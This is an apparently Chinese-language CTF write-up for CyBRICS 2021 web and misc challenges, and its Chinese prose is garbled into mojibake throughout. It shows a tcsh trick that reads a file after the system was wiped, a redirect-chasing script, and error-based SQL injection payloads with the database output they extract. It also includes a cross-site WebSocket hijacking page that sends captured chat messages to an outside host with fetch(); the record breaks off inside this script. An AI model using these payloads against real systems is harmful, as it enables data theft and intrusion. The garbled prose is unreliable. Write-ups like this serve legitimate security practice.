&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
&lt;p>Those organizers are changing &lt;a href="https://cybrics.net/rules">game rules&lt;/a> all the time! Thereâ€™s a flag there, and itâ€™s not that easy to capture.&lt;/p>
&lt;p>&lt;strong>Also be sure to join &lt;a href="https://t.me/cybrics">@cybrics Telegram chat&lt;/a>&lt;/strong> for challenge-related announcements and contacting orgs in case all goes wrong&lt;/p>
&lt;p>&lt;strong>Added at 10:10 â€”&lt;/strong> looks like the little mic check trolling caused massive pain, Iâ€™ve untrolled the rules page :-) You can now copy-paste freely&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724194428638.png" alt="image-20210724194428638">&lt;/p>
&lt;h2 id="scanner-rebyc-baby-50-pts">Scanner (rebyC, Baby, 50 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Mikhail Driagunov (&lt;a href="https://t.me/aethereternity">@aethereternity&lt;/a>)&lt;/p>
&lt;p>Check out this cool new &lt;a href="https://scanner-cybrics2021.ctf.su/">&lt;strong>game&lt;/strong>&lt;/a>!&lt;/p>
&lt;p>I heard they serve flags at level 5.&lt;/p>
&lt;/blockquote>
&lt;p>ä¸éš¾ï¼Œå°±æ˜¯æ¯”è¾ƒé¸¡è´¼ æŠŠå¥½å¥½çš„å›¾ç‰‡å¼„æˆçŠ¹æŠ±çµç¶åŠé®é¢&lt;/p>
&lt;p>é¦–å…ˆç”¨&lt;a href="https://gifsuper.com/">Gif Super&lt;/a>æŠŠå¸§é—´éš”è°ƒä¸º300msï¼Œç„¶åŽè£å‰ªå‡ºä¸­é—´æœ‰ç”¨çš„éƒ¨åˆ† æ”¾å…¥&lt;a href="http://www.atoolbox.net/Tool.php?Id=979">GIFåŠ¨æ€å›¾ç‰‡åˆ†è§£&lt;/a>ä¸­çœ‹ç»“æžœ éƒ½æœ‰åœ¨çº¿å·¥å…·å°±å¾ˆæ–¹ä¾¿&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724202614568.png" alt="image-20210724202614568">&lt;/p>
&lt;p>æ‰€ä»¥è¿™ä¸ªç ´çŽ©æ„åˆ°åº•æ˜¯å•¥ï¼ŸçŒªï¼Ÿè¿˜æ˜¯åˆºçŒ¬ï¼Ÿ
åˆ«çš„éƒ½è¿˜ç®—æ­£å¸¸å§ å°±æ˜¯éƒ½ä¸å¤ªåƒå…¶å®ž æœ‰star, goose, flag, flower, ring, house, bone&amp;hellip;. æœ€åŽä¸€ä¸ªæ˜¯äºŒç»´ç  æ¯”è¾ƒéº»çƒ¦&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724203314255.png" alt="image-20210724203314255">&lt;/p>
&lt;p>å†ç¨å¾®è°ƒæ•´ä¸€ä¸‹å°ºå¯¸ï¼Œæ‰«æå°±è¡Œäº†&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724203713402.png" alt="image-20210724203713402">&lt;/p>
&lt;h2 id="rm--rfer-ctb-baby-166-pts">rm -rfâ€™er (CTB, Baby, 166 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
&lt;p>Alarm! We accidentally did &lt;code>rm -rf /*&lt;/code> on a very important server. Now all thatâ€™s left is one shell session.&lt;/p>
&lt;pre tabindex="0">&lt;code>ssh rmrfer@178.154.210.26
Password: sa7Neiyi
&lt;/code>&lt;/pre>&lt;p>Rescue the &lt;strong>flag.txt&lt;/strong> file from one of the directories by only using your shell&lt;/p>
&lt;p>&lt;strong>Added at 13:45 â€”&lt;/strong> frequent question: yes, if you found &lt;code>flag.txt&lt;/code>, the flag is right there, in the open, as plain text. Just read it. If youâ€™re not seeing the flag, try to find another method that will not hide info from you&lt;/p>
&lt;/blockquote>
&lt;p>è¿™ä¸ªé¢˜ emmmmm
åªè¦sshä¸€è¿žæŽ¥å°±ä¼šè‡ªåŠ¨æ‰§è¡Œ&lt;code>rm -rf /*&lt;/code>çš„æŒ‡ä»¤ï¼Œå½“ååº”è¿‡æ¥çš„æ—¶å€™ç³»ç»Ÿå·²ç»åˆ çš„è¿žlsæŒ‡ä»¤éƒ½ä¸å‰©äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729003620922.png" alt="image-20210729003620922">&lt;/p>
&lt;p>å…ˆè¯´éžé¢„æœŸè§£å§ï¼šå½“è¾“å…¥è¿žæŽ¥å¯†ç åŽç«‹åˆ»ctrl+c åªè¦å¤Ÿå¿« å°±æ‰§è¡Œä¸äº†&lt;code>rm -rf /*&lt;/code>ï¼Œä¹‹åŽå°±å¯ä»¥é¡ºç•…çš„ç©¿æ¢­äºŽè¿™ä¸ªbuildboxä¹‹é—´æ‹¿flagäº†&lt;/p>
&lt;p>é¢„æœŸè§£åˆ™æ˜¯è¿™æ ·çš„ï¼šå½“ç³»ç»Ÿæ‰§è¡Œåˆ é™¤å‘½ä»¤åŽ å¾ˆå¤šå¤–éƒ¨æŒ‡ä»¤éƒ½è¢«åˆ é™¤ éœ€è¦é€šè¿‡ä»…å‰©çš„ä¸€äº›å†…ç½®å‡½æ•°å®Œæˆ&amp;quot;read&amp;quot;çš„åŠŸèƒ½ï¼›ä»Žä¹‹å‰çš„æŠ¥é”™ä¿¡æ¯å¯çŸ¥ buildboxä½¿ç”¨çš„æ˜¯tcshï¼Œåœ¨tcshä¸­&lt;code>echo $&amp;lt;&lt;/code>å‘½ä»¤ç›¸å½“äºŽ&lt;code>read&lt;/code>å‡½æ•°ï¼Œè¯»å…¥æ ‡å‡†è¾“å…¥å¹¶è¾“å‡ºï¼›tcshä¸­åŠ æ‹¬å·çš„å‘½ä»¤éƒ½ä¼šåœ¨å­shellä¸­è¿è¡Œï¼›æž„é€ payload &lt;code>(echo &amp;quot;$&amp;lt;&amp;quot;) &amp;lt; /etc/ctf/flag.txt&lt;/code>ï¼Œå³ è¯»å–flag.txtå¹¶è¾“å‡º&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729005544665.png" alt="image-20210729005544665">&lt;/p>
&lt;h2 id="ad-network-web-baby-50-pts">Ad Network (Web, Baby, 50 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Alexander Menshchikov (&lt;a href="https://t.me/n0str">@n0str&lt;/a>)&lt;/p>
&lt;p>We are so tired of advertising on the internet. It feels like it breaks the internet. Try to follow the ad, try to follow its rules.&lt;/p>
&lt;p>&lt;a href="http://adnetwork-cybrics2021.ctf.su/">Adnetwork website&lt;/a>&lt;/p>
&lt;p>There is a flag 1337 redirects deep into the network&amp;hellip;&lt;/p>
&lt;/blockquote>
&lt;p>&lt;del>è¿™ä¸ªæˆ‘æ˜¯ä¸çŸ¥é“æ€Žä¹ˆåšâ€¦â€¦é¡µé¢ä¸Šçš„ä»»ä½•é“¾æŽ¥éƒ¨åˆ†éƒ½æ˜¯è‡ªå·±é¡µé¢å†…çš„è·³è½¬ï¼Œæç¤ºçš„æ˜¯redirecté‡å®šå‘ï¼Œå¯æ˜¯æŠ“åŒ…åŽæ²¡æœ‰302 ä¹Ÿæ²¡æœ‰ä¸€ç›´åœ¨åšé‡å®šå‘å‘€ è¦æ€Žä¹ˆçœ‹å‘¢ï¼Ÿ&lt;/del>&lt;/p>
&lt;p>emmmm åœ¨æ¯”èµ›ç¬¬äºŒå¤©å†æ¬¡å°è¯•çš„æ—¶å€™ç”¨burpçš„è‡ªå¸¦çš„chromiumçš„æµè§ˆå™¨ï¼ˆä¹‹å‰æ˜¯çŸ¥é“è¿™ä¸ª ä½†æ˜¯æ²¡æœ‰ç”¨è¿‡ï¼‰æ¬¸ é¡µé¢å·¦ä¸Šè§’æ˜¾ç¤ºäº†ä¸€ä¸ªgifå›¾
è¿™ä¸ªå›¾åœ¨æ˜¨å¤©åšçš„æ—¶å€™çœ‹åˆ°ï¼Œ å†…å®¹æ˜¯ &lt;em>awesome ad from adnetwork&lt;/em>ï¼Œä½†æ˜¯edgeæµè§ˆå™¨åœ¨åŠ è½½è¿™ä¸ªå›¾çš„æ—¶å€™ä¼šè‡ªåŠ¨é˜»æ­¢ æˆ‘å•ç‹¬çœ‹äº†å†…å®¹ä¹Ÿæ²¡å‘çŽ°ä»€ä¹ˆç‰¹åˆ«çš„ å°±æ²¡æœ‰æ³¨æ„è¿™é‡Œã€‚äº‹åŽè§’åº¦çœ‹è¿™é‡Œ å…¶å®žä¸€ä¸ªGifå›¾è¢«é˜»æ­¢è¯·æ±‚åº”è¯¥æ˜¯å¾ˆåå¸¸çš„äº‹æƒ…ï¼Œåº”è¯¥é¦–å…ˆå¼•èµ·æ³¨æ„çš„&amp;hellip;&amp;hellip; &lt;del>ï¼ˆéƒ½æ€ªedge!!!&lt;/del>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210725133924877.png" alt="image-20210725133924877">&lt;/p>
&lt;p>ç‚¹å‡»gifä¼šæœ‰å•ç‹¬çš„å¼¹çª—å‡ºæ¥ï¼Œæç¤ºé‡å®šå‘æ¬¡æ•°è¿‡å¤šï¼›çœ‹burpä¸­çš„æŠ“åŒ…è®°å½• ç¡®å®žå¤šçš„ç¦»è°±ï¼ŒæŒ‰ç…§é¢˜ç›®ä¸­çš„æç¤º å¾—æœ‰1337å±‚ï¼Œå¾—ä¸Šä¸ªè„šæœ¬æ…¢æ…¢è·‘äº† è¿™ä¸ªæ¯”è¾ƒå¥½å¼„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210725134346221.png" alt="image-20210725134346221">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://adnetwork-cybrics2021.ctf.su/adnetwork&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">_&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">allow_redirects&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">18&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>emmm æ¯”è¾ƒæ…¢å…¶å®ž åº”è¯¥æœ‰åˆ«çš„çš„æ–¹å¼ï¼Ÿæœ€åŽçš„flagæ˜¯ cybrics{f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z}&lt;/p>
&lt;p>æ¯”èµ›å®Œäº†çœ‹äº†åˆ«çš„wp è¿™å—å¯ä»¥ç”¨sessionè®¾å…è®¸é‡å®šå‘çš„æ¬¡æ•°ï¼Œè¿™æ ·æ›´æ–¹ä¾¿&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Session&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">max_redirects&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1337&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://adnetwork-cybrics2021.ctf.su/adnetwork&amp;#34;&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">allow_redirects&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="announcement-web-easy-60-pts">Announcement (Web, Easy, 60 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Alexander Menshchikov (&lt;a href="https://t.me/n0str">@n0str&lt;/a>)&lt;/p>
&lt;p>Ladies and gentlemen!&lt;/p>
&lt;p>Allow us to introduce a brand new project â€”
âš The Flag&lt;/p>
&lt;p>&lt;a href="http://announcement-cybrics2021.ctf.su/">Announcement website&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ç®€çº¦æ¼‚äº®çš„å‰ç«¯&lt;/p>
&lt;p>æœ‰ä¸ªè¾“å…¥é‚®ç®±çš„æ¡†ï¼Œæäº¤ä¼šå‘é€ä¸€ä¸ªpostè¯·æ±‚ï¼šdigest=xxxx&amp;amp;email=xxxx
å°è¯•ä¸€ä¸ª1@1.comï¼Œé‡æ”¾çš„æ—¶å€™ç›´æŽ¥ä¿®æ”¹emailå€¼ä¼šæç¤ºInvalid digestï¼Œå‘çŽ°å…¶ä¸­digestçš„å€¼å°±æ˜¯md5(&amp;lsquo;&lt;a href="mailto:1@1.com">1@1.com&lt;/a>&amp;rsquo;) éšemailè€Œæ”¹å˜ï¼Œå°è¯•æ³¨å…¥&lt;/p>
&lt;pre tabindex="0">&lt;code>digest=76af11f3eaf7b12e72d7d88e4cf2ee01&amp;amp;email='or'1 // å›žæ˜¾æ­£å¸¸ æ— æŠ¥é”™
digest=c3593d255957d60d5d489ae682da8aee&amp;amp;email=1')# // æŠ¥é”™ï¼šSomething went wrong during database insert: Column count doesn't match value count at row 1
digest=5c07c683d062d17ec799fa177ce88058&amp;amp;email=1',1)# // æŠ¥é”™ï¼šSomething went wrong during database insert: Incorrect datetime value: '1' for column 'timestamp' at row 1
&lt;/code>&lt;/pre>&lt;p>ç¡®å®šæ˜¯sqli å¹¶ä¸”å½“å‰è¡¨æœ‰ä¸¤åˆ— email+timestampï¼Œä½¿ç”¨çš„è¯­å¥åº”è¯¥æ˜¯è¿™ä¸ªå§ï¼Ÿ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#00a8c8">insert&lt;/span> &lt;span style="color:#00a8c8">into&lt;/span> &lt;span style="color:#00a8c8">table_name&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">email&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">timestamp&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">values&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">email&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">now&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯åˆ©ç”¨çš„éƒ¨åˆ†æ˜¯å¯ä»¥æ’å…¥çš„emailï¼ŒæŠ¥é”™æ³¨å…¥&lt;/p>
&lt;pre tabindex="0">&lt;code>digest=e1e79bd6fafe38f7073ec1f3ef1513fa&amp;amp;email=1',1 or updatexml(1,concat(0x7e,database()),0))# // Something went wrong during database insert: XPATH syntax error: '~announcement'
digest=c9f14624524736a74164cc6024fdefce&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='announcement')),0) or ' // Something went wrong during database insert: XPATH syntax error: '~emails,logs'
digest=94707222b90505ab0aa5e1fd3916e77d&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='announcement' and table_name='logs')),0) or ' // Something went wrong during database insert: XPATH syntax error: '~log'
digest=66bf6db11d9bee8e897b874a430f5704&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(log) from logs)),0) or ' // Something went wrong during database insert: XPATH syntax error: '~cybrics{1N53r7_0ld_900d_5ql}'
&lt;/code>&lt;/pre>&lt;p>æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œç»å…¸æŠ¥é”™æ³¨å…¥æµç¨‹ï¼šç¡®å®šå­—æ®µæ•°-&amp;gt;çˆ†æ•°æ®åº“å(announcement)-&amp;gt;è¡¨å(emails, logs)-&amp;gt;å­—æ®µå(log)-&amp;gt;å…·ä½“æ•°æ® æ‹¿flag&lt;/p>
&lt;h2 id="multichat-web-medium-138-pts">Multichat (Web, Medium, 138 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Alexander Menshchikov (&lt;a href="https://t.me/n0str">@n0str&lt;/a>)&lt;/p>
&lt;p>Yet another chat-messenger with rooms support! Free to use. Convince the admin that its code is insecure.&lt;/p>
&lt;p>Tip: Admin and tech support are members of a secret chat room. Tech support can ask admin to tell him the flag, to do that tech support writes him a message (in a chat): &amp;ldquo;&lt;code>Hey, i forgot the flag. Can you remind me?&lt;/code>&amp;rdquo;. Then admin will tell him the flag.&lt;/p>
&lt;p>&lt;a href="http://multichat-cybrics2021.ctf.su/">Multichat website&lt;/a>&lt;/p>
&lt;p>Team token for the support call: &lt;code>p32vhJKrnx_hajUc8nLTFw&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>èŠå¤©å®¤ï¼Œadminå’Œtech supportåœ¨ä¸€ä¸ªç§˜å¯†çš„èŠå¤©å®¤å†…ï¼ˆ10ä½æ•°å­—çš„æˆ¿é—´å·ï¼‰ï¼Œtech supportå¯ä»¥è®©adminç»™å‡ºflagï¼ˆåŽé¢é‚£ä¸ªteam token for the support callæ˜¯è¦ç”¨åˆ°å—è¿˜æ˜¯æ€Žä¹ˆæ ·&lt;/p>
&lt;p>æŠ“åŒ…ï¼Œçœ‹åˆ°äº†&lt;code>Connection: Upgrade&lt;/code> &lt;code>Upgrade: websocket&lt;/code>ï¼Œè¿™ä¸ªèŠå¤©å®¤æ˜¯å»ºç«‹äº†ä¸€ä¸ªwebsocketè¿žæŽ¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724225447805.png" alt="image-20210724225447805">ï¼ˆwebsocketè¿™å—çŸ¥è¯†å°è±¡ä¸­ä¹‹å‰æŽ¥è§¦è¿‡ä¸€æ¬¡ ä¹Ÿå°±ä¸€æ¬¡ ç›¸å…³é“¾æŽ¥è¿˜æ˜¯æ”¾åŽé¢&lt;/p>
&lt;p>é“¾æŽ¥é‡Œçš„ä¸€ä¸ªcsrfæ”»å‡»çš„å®žä¾‹è·Ÿè¿™ä¸ªæœ‰ç‚¹åƒäº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210724232946228.png" alt="image-20210724232946228">&lt;/p>
&lt;p>ä½†æ˜¯è¿™é‡Œçš„åˆä¸å¤ªä¸€æ ·ï¼Œwebsocketæœ€åˆå»ºç«‹æ—¶çš„httpéƒ¨åˆ† cookieä¸­æœ‰chatroomçš„idï¼Œè¿™ä¸ªå€¼æ˜¯æœªçŸ¥çš„ï¼ˆ&lt;em>Admin and tech support are members of a secret chat room.&lt;/em>ï¼‰ï¼›å¦å¤–tech supportæ˜¯å…ˆä¼šå‘*â€˜Hey, i forgot the flag. Can you remind me?â€™*ï¼Œéœ€è¦çš„æ˜¯è§¦å‘ï¼ˆå¦‚æžœå®ƒä¸ä¼šè‡ªå·±å‘è¿™ä¸€æ¡å†…å®¹çš„è¯ï¼‰å’Œç›‘å¬å®ƒçš„ä¿¡æ¯ ç„¶åŽæ•æ‰åˆ°å®ƒçš„ä¸‹ä¸€æ¡adminå‘é€çš„å†…å®¹ï¼Œæ‹¿åˆ°flag&lt;/p>
&lt;p>ï¼ˆæ¯”èµ›çš„æ—¶å€™å°±æƒ³åˆ°è¿™é‡Œï¼Œå…·ä½“çš„å®žçŽ°ä¸çŸ¥é“è¯¥æ€Žä¹ˆå¼„äº†ï¼Œä»¥ä¸‹æ˜¯çœ‹äº†wpä¹‹åŽçš„å¤çŽ°ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728001013129.png" alt="image-20210728001013129">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728001122843.png" alt="image-20210728001122843">&lt;/p>
&lt;p>5000ç«¯å£å¤„æœ‰Supporté¡µé¢ï¼Œtech supportåœ¨è¿™é‡Œå¯ä»¥è®¿é—®ä»»æ„çš„é¡µé¢å¹¶å»ºç«‹websocketå‘é€æ¶ˆæ¯ï¼Œä¸é™åˆ¶è·¨åŸŸ æ‰€ä»¥å¯ä»¥å°†è‡ªå·±çš„ç½‘ç«™å†™åˆ°è¿™é‡Œï¼Œsupportä¼šå¸¦ç€å®ƒçš„cookieï¼ˆå’Œadminåœ¨ä¸€ä¸ªæˆ¿é—´é‡Œ cookieæ˜¯æˆ¿é—´idï¼‰è¿‡æ¥è®¿é—®ï¼Œç„¶åŽå€ŸåŠ©jsçš„è„šæœ¬æ‹¿åˆ°å®ƒçš„cookieï¼›ä»¥ä¸‹æ˜¯&lt;a href="https://mp.weixin.qq.com/s/SQ-DGvug-P6PK-s3qkJVdw">æ¥è‡ªw&amp;amp;mçš„è„šæœ¬&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">head&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">head&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;text/javascript&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">WebSocket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ws://multichat-cybrics2021.ctf.su/ws&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onclose&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">item&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#ae81ff">1003&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">item&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`Status: &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">reason&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">item&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Connection closed.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://api.chara.pub:1337/aaa.txt?&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">encodeURIComponent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">item&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onopen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">fetch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://api.chara.pub:1337/aaa.txt?&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">encodeURIComponent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;connected&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#75af00">conn&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onmessage&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
